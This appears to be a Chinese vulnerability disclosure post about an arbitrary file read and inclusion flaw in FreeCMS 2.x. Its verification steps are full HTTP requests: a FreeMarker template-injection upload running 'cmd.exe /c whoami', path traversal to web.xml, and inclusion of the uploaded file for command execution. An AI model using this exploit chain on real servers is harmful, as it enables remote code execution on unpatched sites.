---
title: FreeCMS 商业版 2.x 任意文件读取与文件包含漏洞
published: 2025-09-24 15:48
tags: [安全, 漏洞, FreeCMS]
category: 网安
draft: false
---

# FreeCMS商业版2.x版存在任意文件读取和任意文件包含漏洞

## 一、报告概述

FreeCMS商业版2.x版存在任意文件读取和任意文件包含漏洞，攻击者可以通过任意文件读取漏洞配合任意文件包含漏洞获取服务器权限。

## 二、报告详情

### （一）漏洞描述

FreeCMS商业版2.x版存在任意文件读取和任意文件包含漏洞，攻击者可以通过任意文件读取漏洞配合任意文件包含漏洞获取服务器权限。

### （二）影响范围

FreeCMS商业版2.x版。

### （三）验证方法

**1. 文件上传**

```
POST /freecms/image.upload HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Safari/537.36
Content-Length: 245

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: image/jpeg

<#assign value="freemarker.template.utility.Execute"?new()>${value("cmd.exe /c whoami")}
------WebKitFormBoundaryABC123—
```

![image1.png](/images/posts/freecms/image1.png)

**2. 查看上传文件**

```
GET /upload/20250712/202507124.7353792948194275.txt HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Sec-GPC: 1
Connection: close
Cookie: JSESSIONID=FAD00DDBD51EB9270FF15A07B3A5C081
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Priority: u=0, i
```

![image2.png](/images/posts/freecms/image2.png)

**3. 任意文件读取**

```
POST /templetProFhtml.do HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Sec-GPC: 1
Connection: close
Cookie: JSESSIONID=FAD00DDBD51EB9270FF15A07B3A5C081
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

siteFolder=FreeCMS&templetPath=info/../../../WEB-INF/web.xml
```

![image3.png](/images/posts/freecms/image3.png)

**4. 配合FreeMarker模板注入命令执行**

```
POST /templetProFhtml.do HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Sec-GPC: 1
Connection: close
Cookie: JSESSIONID=FAD00DDBD51EB9270FF15A07B3A5C081
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

siteFolder=FreeCMS&templetPath=/../../../upload/20250712/202507124.7353792948194275.txt
```

![image4.png](/images/posts/freecms/image4.png)

### （四）修复建议

1. 官方暂未修复该漏洞，建议对相关接口进行限制
